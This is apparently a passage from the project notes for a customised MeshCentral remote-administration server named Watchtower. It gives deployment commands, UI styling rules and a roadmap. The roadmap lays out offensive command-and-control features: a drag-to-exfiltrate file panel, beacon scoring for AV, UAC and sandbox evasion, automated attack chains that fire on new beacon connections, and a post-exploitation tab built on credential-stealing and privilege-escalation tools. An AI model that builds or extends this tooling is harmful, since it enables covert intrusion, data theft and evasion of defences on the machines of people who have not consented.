- **Fix**: Mirror MeshCentral's own "Add Mesh Agent" dialog: `serverinfo.name + serverinfo.port + domainUrl`

---

## Deployment Guide

### Fresh Windows Machine
```powershell
# Run as Administrator
cd C:\path\to\meshcentral
powershell -ExecutionPolicy Bypass -File install.ps1
```
Or double-click `start.bat` — it auto-calls `install.ps1` if Node.js is missing.

### Fresh Linux / macOS / VPS
```bash
cd /path/to/meshcentral
chmod +x start-watchtower.sh
./start-watchtower.sh
```
On first run: installs Node.js for your distro, runs npm install, detects IP, writes config.json.

### Moving to a New Host
Just copy the entire `meshcentral/` directory (includes `meshcentral-data/` with DB + certs), then run the start script. It auto-detects the new IP, updates config.json, and rotates TLS certs.

### IP Change (manual)
1. Edit `meshcentral-data/config.json` → update `"cert"` value
2. Delete `meshcentral-data/webserver-cert-*.{key,crt}` and `agentserver-cert-*.{key,crt}`
3. Delete `meshcentral-data/signedagents/*` (cached agent binaries with old IP baked in)
4. Restart

---

## Preferences
- Terminal commands default to CMD-safe syntax; wrap PS-only commands in `powershell -ep bypass -c "..."`
- All custom CSS must use `!important` and scoped selectors to beat MeshCentral's existing rules
- Theme: dark `#0a0e14` background, `#00d4ff` cyan, `#00ff41` green, `#ff3333` red, `#ff8c00` orange, `#a855f7` purple (VM/OBFUS), `#ffd700` gold (WTAgent)
- Broadcast bar uses orange `#ff8c00` — distinct from cyan toolbar buttons
- All panels insert after `#devListToolbarSpan`
- Global button rule `button:not(.xterm-helper-textarea)` spec `0,1,1` — scope with `#id .class` to beat it
- Input fields in custom panels need `stopPropagation` on key events to prevent MeshCentral's global handler from swallowing keystrokes

## Roadmap (Pending)
- **Section 28: Screenshot Gallery** — Grid of remote desktop screenshots with timestamps
- **Section 30: File Exfil Panel** — Visual file tree browser, drag-to-exfil, exfil history
- **Section 33: OPSEC Beacon Scoring** — Auto-score 1–10 (AV/UAC/domain-joined/admin/sandbox) shown in beacon table
- **Section 34: Automated Playbooks** — Multi-step attack chains, auto-fire on new beacon connect
- **POST-EX Tab in Payload Studio** — WinPEAS, LaZagne, SharpHound, PrintSpoofer, GodPotato
